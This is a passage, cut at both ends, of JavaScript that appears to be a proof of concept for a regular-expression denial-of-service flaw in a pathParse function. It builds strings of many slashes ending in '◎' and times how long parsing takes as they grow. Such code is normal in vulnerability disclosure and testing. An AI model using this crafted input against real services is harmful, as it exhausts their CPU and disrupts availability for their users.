    var ret = \\"\\"
    for (var i = 0; i < n; i++) {
        ret += \\"/\\"
    }
    return ret + \\"◎\\";
}

for(var i = 1; i <= 5000000; i++) {
    if (i % 10000 == 0) {
        var time = Date.now();
        var attack_str = build_attack(i)
        pathParse(attack_str);
        var time_cost = Date.now() - time;
